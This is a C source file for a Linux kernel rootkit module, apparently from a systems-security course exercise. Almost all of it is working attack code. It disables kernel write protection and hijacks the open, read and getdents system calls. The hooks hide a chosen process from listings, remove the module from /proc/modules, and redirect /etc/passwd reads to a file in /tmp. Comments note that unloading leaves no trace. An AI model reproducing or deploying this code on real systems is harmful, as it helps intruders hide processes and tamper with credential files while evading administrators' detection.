#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

#define BUFFLEN 512
static int sneaky_pid = 0;
module_param(sneaky_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(sneaky_pid, "Sneaky_process_pid");

static bool check_lsmod = false; //true only when access the file /proc/modules

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81073190;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81073110;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call_open)(const char *pathname, int flags, mode_t mode); //open
asmlinkage ssize_t (*original_call_read)(int fd, void *buf, size_t count); //read
struct linux_dirent {
  u64 d_ino;               /* 64-bit inode number */
  s64 d_off;               /* 64-bit offset to next structure */
  unsigned short d_reclen; /* Size of this dirent */
  char d_name[BUFFLEN];    /* Filename (null-terminated) */
};
asmlinkage int (*original_call_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count); //getdents


//Define our new sneaky version of the 'open' syscall========================================================
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  const char* etc_path = "/etc/passwd";
  const char* tmp_path = "/tmp/passwd";
  if(strcmp(pathname, "/proc/modules") == 0) {
    check_lsmod = true;
  }
  else if(strcmp(pathname, etc_path) == 0) {
    copy_to_user((void*)pathname, tmp_path, strlen(pathname));
  }
  return original_call_open((const char*)pathname, flags, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
}

//Define our new sneaky version of the 'read' syscall========================================================
asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) //read
{
  int nread = -1;
  size_t sz = 0;
  void *sneaky_mod_lineStart_ptr = NULL; //the line should be deleted: sneaky_mod  16384  0\n
  void *sneaky_mod_lineEnd_ptr = NULL;
  
  nread = original_call_read(fd, buf, count);
  if(nread <= 0) {
    return nread; //error or nothing read
  }

  while(check_lsmod == true) {
    sneaky_mod_lineStart_ptr = strstr(buf, "sneaky_mod");
    if(sneaky_mod_lineStart_ptr == NULL) {
      break;
    }
    sneaky_mod_lineEnd_ptr = strstr(sneaky_mod_lineStart_ptr, "\n");
    sneaky_mod_lineEnd_ptr += 1; //remove \n
    sz = strlen((char *)sneaky_mod_lineEnd_ptr);
    memmove(sneaky_mod_lineStart_ptr, sneaky_mod_lineEnd_ptr, sz);

    nread -= (sneaky_mod_lineEnd_ptr - sneaky_mod_lineStart_ptr);
  }
  check_lsmod = false;
  return nread;
}

//Define our new sneaky version of the 'getdents' syscall====================================================
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
  int nread = -1;
  struct linux_dirent *d;
  int bpos;
  char sneaky_pid_str[BUFFLEN] = {0};
  snprintf(sneaky_pid_str, BUFFLEN, "%d", sneaky_pid);
  
  nread = original_call_getdents(fd, dirp, count);
  if(nread <= 0) {
      return nread; //error or end of directory
  }

  //find sneaky process and delete it
  for (bpos = 0; bpos < nread;) {
    d = (struct linux_dirent *) ((char *)dirp + bpos);
    if(strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, sneaky_pid_str) == 0) {
      size_t sz = (size_t)nread - bpos - d->d_reclen;
      nread -= d->d_reclen;
      memmove((void *)d, ((void *)d + d->d_reclen), sz);
    }
    else{
      bpos += d->d_reclen;
    }
  }
  return nread;
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open; //open

  original_call_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read; //read

  original_call_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents; //getdents

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call_open;
  *(sys_call_table + __NR_read) = (unsigned long)original_call_read; //read
  *(sys_call_table + __NR_getdents) = (unsigned long)original_call_getdents; //getdents

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

